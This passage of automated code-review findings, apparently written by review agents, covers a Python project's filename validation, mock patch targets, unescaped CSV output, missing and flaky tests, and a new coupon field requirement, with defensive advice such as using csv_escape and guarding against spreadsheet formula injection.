findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` up to 64 characters, so names that the old implementation accepted and wrote successfully now raise `ValueError` at the top of the function: anything containing a dot (`nightly.2024-01-01`, `customer.data`), a space, or longer than 64 characters (e.g. a tenant slug concatenated with a timestamp). This is a behavioural break for every existing caller, not only malicious input, and it surfaces as an uncaught exception rather than a failed archive. Confirm no caller passes dotted or long names; if they do, widen the class to include `.` (the `fullmatch` anchor plus the absence of `/` already blocks traversal) or raise the length bound. Separately, a non-`str` `name` (e.g. an int id) now raises `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() with an empty invoice but never checks the result. It will pass regardless of what render() returns or even if it silently produces wrong output, as long as it doesn't raise. Add an assertion on the actual return value, e.g. asserting the expected rendered text for an empty invoice.

The test patches out format_line and asserts only that it was called twice. It never checks what render() actually returns, so a bug that produces wrong formatting, wrong ordering, or wrong output for line items would not be caught. Assert on the rendered output (e.g. that render(...) contains the formatted line items) instead of, or in addition to, the mock call count.

findings.title: Deleted test removes only coverage for the rounding fix
findings.body:
The commit deletes test_rounds_half_to_even, which asserted round_cents(Decimal("2.345")) == Decimal("2.34"). This is the exact behaviour the PR claims to fix (half-to-even rounding). With it removed, nothing in the remaining suite verifies the corrected rounding logic — a regression or an incorrect fix would pass silently. findings.body: The PR is described as fixing the rounding, but the only file touched is the test module and the only change is a deletion. No change to `round_cents` (or wherever the rounding mode lives) is present. Please confirm which, and include the implementation change in the same PR so reviewers can see the behaviour change alongside the test update.

findings.title: Patch target misses the name lookup; real deliver() still runs
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as a module-global of `notify.sender` at import time. `send_with_retry` resolves the name against `notify.sender.deliver`, so patching `notify.transport.deliver` rebinds only the source module's attribute and leaves the copy the function under test actually calls untouched.

Consequence: the real `deliver` is invoked three times during this test (real I/O / side effects), and the assertion passes or fails based on whatever the real transport returns rather than on the stub. If the real `deliver` happens to return a falsy value the test goes green while proving nothing about the retry-exhaustion path; if it returns truthy the test fails for reasons unrelated to the code.

Change the target to `notify.sender.deliver`, matching the existing test on line 2. Consider also asserting the call count is 3 so the test actually covers the retry loop it is named for.

_Also raised by the tests agent:_ Mock patches wrong target; test cannot fail meaningfully

findings.title: Test contradicts documented patching requirement
findings.body: The new test patches `notify.transport.deliver`, but the sender module documentation (in notify/sender.py lines 4-5) explicitly states that this approach does not work: 'patching `notify.transport.deliver` does not affect it' because `deliver` is bound into the sender module's namespace at import time. The test should patch `notify.sender.deliver` instead, as the first test does on line 2.

findings.title: csv_rows joins raw values, bypassing the new csv_escape helper
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) for c in columns)` and never calls `csv_escape`, which was added in the same change for exactly this purpose. Any field value containing a comma, a double quote or a newline injects extra fields (or extra records) into the output, so a user who controls one cell of a report can control the shape of the whole row as seen by whatever consumes the CSV. Pipe each value through `csv_escape` inside the join, and extend `csv_escape` to also quote values containing `\n`/`\r` (and to accept non-str input, since `csv_rows` stringifies first). Standard-library `csv.writer` handles all of this correctly and would remove the class of bug entirely. While you are there, consider prefixing values that begin with `=`, `+`, `-` or `@` to avoid spreadsheet formula injection in exports opened in Excel/Sheets.

_Also raised by the correctness agent:_ csv_escape misses newlines and assumes a str argument

findings.title: csv_rows emits unescaped fields, producing malformed CSV
findings.body: `csv_rows` interpolates each field with `str(...)` and joins on `","` without ever calling `csv_escape`, which is defined immediately below for exactly this purpose. Any value containing a comma, a double quote, or a newline silently shifts or breaks the column alignment of the emitted row — a row like `{"a": "x,y", "b": "z"}` renders as `x,y,z`, which parses back as three columns instead of two. Route each field through `csv_escape` (e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`), or delegate to the stdlib `csv` module.

findings.title: New exporter functions lack tests
findings.body: csv_rows, csv_escape (reports/csv_export.py), dump_streaming, dump_pretty (reports/json_export.py), and margins_for, usable_width (reports/pdf_export.py) are all new public functions with no accompanying tests. The repository already tests csv_header in reports/tests/test_csv.py, so these new functions fall below the existing coverage bar. A bug in, e.g., csv_escape's quote-doubling logic or the off-by-one in dump_streaming's chunking would go completely undetected.

findings.title: Time-dependent test flakes at UTC midnight boundary
findings.body:
test_token_issued_today_is_valid() calls issue_token() and then independently calls datetime.now(timezone.utc) to compare dates. If the token is issued just before midnight UTC and the comparison happens just after (or vice versa, due to scheduling delays, CI slowness, or clock drift), token.issued_at.date() will not equal datetime.now(timezone.utc).date(), causing a spurious failure unrelated to any real bug. This test should either freeze time (e.g. via freezegun or a fixed clock) or avoid comparing two independently-taken 'now' timestamps across a date boundary.

_Also raised by the correctness agent:_ Date-equality assertion races the UTC midnight boundary

findings.title: apply_coupon now requires coupon.expires_at; existing callers may not set it
findings.body: `apply_coupon` previously read only `coupon.amount`. Line 9 adds an unconditional read of `coupon.expires_at`, which the diff itself shows was not part of the coupon shape before — the test on tests/test_coupons.py line 3 had to be amended from `Coupon(amount=10)` to `Coupon(amount=10, expires_at=tomorrow())` to keep passing.
